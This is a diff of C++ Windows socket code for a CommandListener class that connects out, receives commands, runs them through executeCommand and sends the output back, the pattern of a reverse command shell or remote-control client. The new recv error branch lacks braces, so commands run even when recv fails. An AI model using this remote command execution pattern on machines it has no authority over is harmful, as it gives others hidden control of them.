@@ -18,12 +18,14 @@ void CommandListener::startListening()
 {
   connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
   while (1) {
-    cout << "Begin of the loop" << endl;
+    // cout << "Begin of the loop" << endl;
     memset(message, 0, sizeof(message));
     r = recv(sConnect, message, sizeof(message), 0);
-    cout << r << endl;
-    cout << message << endl;
-    handleCommand(message);
+    if (r < 0)
+      cout << "Recv fails" << endl;
+    else
+      cout << message << endl;
+      handleCommand(message);
   }
   closesocket(sConnect);
 
@@ -46,13 +48,11 @@ void CommandListener::setupSocket()
 
 void CommandListener::handleCommand(const char* cmd)
 {
-  // 大哥這不是python, 字串比較要用function
-  // git blame yoyopig
   if(strcmp(cmd, "stop") == 0)
   {
-    cout << "In stop" << endl;
     StopAllThreads sat;
     sat();
+    // TO-DO exit the program
   }
   else if(strcmp(cmd, "random") == 0)
   {
@@ -64,9 +64,9 @@ void CommandListener::handleCommand(const char* cmd)
     string str = executeCommand(message);
     char *sendbuf = &str[0];
     send(sConnect,sendbuf,(int)strlen(sendbuf),0);
-    char done[30] = "Command executed.\n";
-    send(sConnect,done,(int)strlen(done),0);
   }
+  char done[30] = "Command executed.\n";
+  send(sConnect,done,(int)strlen(done),0);
 }
 
 string CommandListener::executeCommand(const char* cmd)
